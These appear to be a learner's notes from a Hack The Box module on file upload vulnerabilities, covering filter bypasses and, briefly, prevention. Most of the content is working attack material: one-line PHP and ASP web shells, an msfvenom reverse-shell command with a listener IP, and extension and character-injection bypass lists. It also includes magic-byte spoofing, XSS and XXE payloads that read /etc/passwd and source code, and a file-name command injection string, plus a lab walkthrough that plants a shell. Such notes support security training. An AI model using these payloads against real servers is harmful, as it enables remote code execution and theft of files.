# Basic Exploitation

## Absent Validation

- `does not have any form of validation filters` -> allows any files to upload


- most commonly `Web Shell` script and a `Reverse Shell` script are used
	- but the script languages must be same with the vulnerable web
- identify using wappalyzer or extention (/index.php)

## Upload Exploitation

- upload shell to interact with the server
- good option for `PHP` is [phpbash](https://github.com/Arrexel/phpbash)


### Custom Web shell


```php
<?php system($_REQUEST['cmd']); ?>
```

```asp
<% eval request('cmd') %>
```


## Reverse Shell

- download a reverse shell script in the language of the web application
- reliable reverse shell for `PHP` is the [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell)
### Generating Custom Reverse Shell Scripts

- using metasploit

```shell
msfvenom -p php/reverse_php LHOST=10.10.14.251 LPORT=1111 -f raw > reverse.php
```


# Client-Side Validation

- validation only on frontend using js

### Back-end Request Modification

- intercept via burpsuite and modify the request

![[Pasted image 20240610111101.png]]

- modify :
	1) filename="HTB.png"
	2) content of the file
	3) content-type

### Disabling Front-end Validation

- manipulating the front-end code
![[Pasted image 20240610111350.png]]
- checkfile() functions checks the format 

```javascript
function checkFile(File) {
...SNIP...
    if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
        $('#error_message').text("Only images are allowed!");
        File.form.reset();
        $("#submit").attr("disabled", true);
    ...SNIP...
    }
}
```

- remove this function and it looks like..


![[Pasted image 20240610111445.png]]


# Blacklist Filters

- file type validation on the back-end
- two types of validation
	1) Testing against a `blacklist` of types
	2. Testing against a `whitelist` of types

#### Blacklist File extension

```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$extension = pathinfo($fileName, PATHINFO_EXTENSION);
$blacklist = array('php', 'php7', 'phps');

if (in_array($extension, $blacklist)) {
    echo "File type not allowed";
    die();
}
```

- Windows Servers, file names are case insensitive , Upload with ==pHp==

#### Fuzzing Extensions

- `PayloadsAllTheThings`  lists of extensions for [PHP](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) and [.NET](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP)
- `SecLists` list of common [Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)
- now fuzz the extension in filename.
![[Pasted image 20240610113633.png]]

- sort the results by `Length`
- look the response for bypassed extensions
![[Pasted image 20240610113746.png]]

- try out which extension is executing php script
- in my case .php3 doesnot execute (shows the payload as it is) but .phar executes the payload

# Whitelist Filters

- only allow the specified extensions,
- consider this just checks whether jpg etc.. are part of extension not ending with 
```php
$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```


- we can bypass this easily with (.jpg.php)


```php
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ...SNIP... }
```

- this check the last extension , which mitigates the above  but still vulnerable

### Reverse Double Extension
- in some cases web server configuration is vulnerable
- After a file is uploaded, the web server handles how different file types are processed and executed
- example the `/etc/apache2/mods-enabled/php7.4.conf` for the `Apache2` is configured as

```xml
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```

- this is the same type which checks whether php part of file extension, then the file content are executed as php

![[Pasted image 20240610133946.png]]

- here it checks for last extension is .ph(ar|p|tml) , if yes it execute as php (==$== is at end)
- but if backend code filters .ph(ar|p|tml) then code execution id not possible


#### Character Injection
- inject character to misinterpret the filename and execute
- some of the characters we may try injecting:
```
%20
%0a
%00
%0d0a
/
.\
.
…
:
```

**Example:**
- `shell.php%00.jpg` works with PHP servers version `5.X` or earlier
	- as end the file name after the (`%00`), and store it as (`shell.php`)
- `shell.aspx:.jpg` works with windows server
	- should also write the file as (`shell.aspx`)

**Custom File Extension Generator:**
- using character injection

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```


# Type Filters
- as far as only file extensions are checked , not the contents of the file
- modern web servers and web applications  test the content of the file to ensure it matches the specified type
- two method to validate the file content
	1) `Content-Type Header` 
	2) `File Content` (MIME-TYPE)
##### Content-Type Header
- Content-Type Header automatically set by our browser , when we select a file from dialog box
- client side => we can bypass easily (capture via burp)
- consider the below

```php
$type = $_FILES['uploadFile']['type'];

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

- while blackbox testing ,start by fuzzing the Content-Type header with SecLists [Content-Type Wordlist](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- here image is taken as input file so `cat content-type.txt | grep 'image/' > image-content-types.txt`

##### MIME-Type
- usually more accurate than testing the file extension
- determines the type of a file through its general format and bytes structure
- done by inspecting the first few bytes of the file's content, which contain the [File Signature](https://en.wikipedia.org/wiki/List_of_file_signatures) or [Magic Bytes](https://opensource.apple.com/source/file/file-23/file/magic/magic.mime)
- a file starts with (`GIF87a` or `GIF89a`) => GIF file
-  file starting with plaintext => text file
	- change the first bytes of any file to the GIF magic bytes => GIF file

**Example:**

```shell
pradyun2005@htb[/htb]$ echo "this is a text file" > text.jpg 
pradyun2005@htb[/htb]$ file text.jpg 
text.jpg: ASCII text
```

```shell
pradyun2005@htb[/htb]$ echo "GIF8" > text.jpg 
pradyun2005@htb[/htb]$file text.jpg
text.jpg: GIF image data
```

**Backend Code:**

```php
$type = mime_content_type($_FILES['uploadFile']['tmp_name']);

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```




# Limited File Uploads

-  weak filters can be exploited to upload arbitrary files
- secure filters that may not be exploitable using above
- dealing with a limited (i.e., non-arbitrary) file upload form

##### XSS
- web applications that display an image's metadata after its upload

```shell
pradyun2005@htb[/htb]$ exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
pradyun2005@htb[/htb]$ exiftool HTB.jpg
...SNIP...
Comment                         :  "><img src=1 onerror=alert(window.origin)>
```

- if we change mime type to `text/html`, some web applications may show it as an HTML document => trigger xss


**Viz SVG images**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```



##### XXE Attacks

- fetch files

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

- XXE to read source code in PHP web applications

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```



# Other Upload Attacks

##### Injections in File Name
- `file$(whoami).jpg` or ``file`whoami`.jpg`` or `file.jpg||whoami`



# Preventing File Upload Vulnerabilities


## Extension Validation


```php
$fileName = basename($_FILES["uploadFile"]["name"]);

// blacklist test
if (preg_match('/^.+\.ph(p|ps|ar|tml)/', $fileName)) {
    echo "Only images are allowed";
    die();
}

// whitelist test
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

- with blacklisted extension =>if the extension exists anywhere within the file name
- with whitelists=>if the file name ends with the extension


## Content Validation

```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// whitelist test
if (!preg_match('/^.*\.png$/', $fileName)) {
    echo "Only PNG images are allowed";
    die();
}

// content test
foreach (array($contentType, $MIMEtype) as $type) {
    if (!in_array($type, array('image/png'))) {
        echo "Only SVG images are allowed";
        die();
    }
}
```


## Upload Disclosure


- donot expose upload directory
- access permissionf for upload directory
- randomize the names of the uploaded files in storage and store their "sanitized" original names in a database
- use another page to download files `download.php`only grants access to files owned by the users
- do not have direct access to the uploads directory by utilizing the `Content-Disposition` and `nosniff` headers


- `disable_functions` configuration in `php.ini` and add such dangerous functions, like `exec`, `shell_exec`, `system`, `passthru`
- 




# SKILL ASSESSMENT
##### Allowed MIME types
- image/jpeg
- image/png
- ==image/svg==

**Limited File Attack**
- using this payload 
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
```
- got base64 and when i decode
```php
<?php
require_once('./common-functions.php');

// uploaded files directory
$target_dir = "./user_feedback_submissions/";

// rename before storing
$fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);
$target_file = $target_dir . $fileName;

// get content headers
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// blacklist test
if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) {
    echo "Extension not allowed";
    die();
}

// whitelist test
if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) {
    echo "Only images are allowed";
    die();
}

// type test
foreach (array($contentType, $MIMEtype) as $type) {
    if (!preg_match('/image\/[a-z]{2,3}g/', $type)) {
        echo "Only images are allowed";
        die();
    }
}

// size test
if ($_FILES["uploadFile"]["size"] > 500000) {
    echo "File too large";
    die();
}

if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
    displayHTMLImage($target_file);
} else {
    echo "File failed to upload";
}

```
- From this Source code
	- /contact/user_feedback_submissions/240610_test_image.phar.jpg
- Download a sample jpg image and 
		``echo '<?php system($_REQUEST['cmd']); ?>' >> test_image.phar.jpg``

![[Pasted image 20240610183959.png]]




<svg>&xxe;</svg>










































# CHEETSHEETS
## Web Shells

| **Web Shell**                                                                           | **Description**                       |
| --------------------------------------------------------------------------------------- | ------------------------------------- |
| `<?php file_get_contents('/etc/passwd'); ?>`                                            | Basic PHP File Read                   |
| `<?php system('hostname'); ?>`                                                          | Basic PHP Command Execution           |
| `<?php system($_REQUEST['cmd']); ?>`                                                    | Basic PHP Web Shell                   |
| `<% eval request('cmd') %>`                                                             | Basic ASP Web Shell                   |
| `msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php`          | Generate PHP reverse shell            |
| [PHP Web Shell](https://github.com/Arrexel/phpbash)                                     | PHP Web Shell                         |
| [PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell)                 | PHP Reverse Shell                     |
| [Web/Reverse Shells](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) | List of Web Shells and Reverse Shells |
|                                                                                         |                                       |

## Bypasses

|**Command**|**Description**|
|---|---|
|**Client-Side Bypass**||
|`[CTRL+SHIFT+C]`|Toggle Page Inspector|
|**Blacklist Bypass**||
|`shell.phtml`|Uncommon Extension|
|`shell.pHp`|Case Manipulation|
|[PHP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)|List of PHP Extensions|
|[ASP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP)|List of ASP Extensions|
|[Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)|List of Web Extensions|
|**Whitelist Bypass**||
|`shell.jpg.php`|Double Extension|
|`shell.php.jpg`|Reverse Double Extension|
|`%20`, `%0a`, `%00`, `%0d0a`, `/`, `.\`, `.`, `…`|Character Injection - Before/After Extension|
|**Content/Type Bypass**||
|[Web Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)|List of Web Content-Types|
|[Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt)|List of All Content-Types|
|[File Signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)|List of File Signatures/Magic Bytes|

## Limited Uploads

|**Potential Attack**|**File Types**|
|---|---|
|`XSS`|HTML, JS, SVG, GIF|
|`XXE`/`SSRF`|XML, SVG, PDF, PPT, DOC|
|`DoS`|ZIP, JPG, PNG|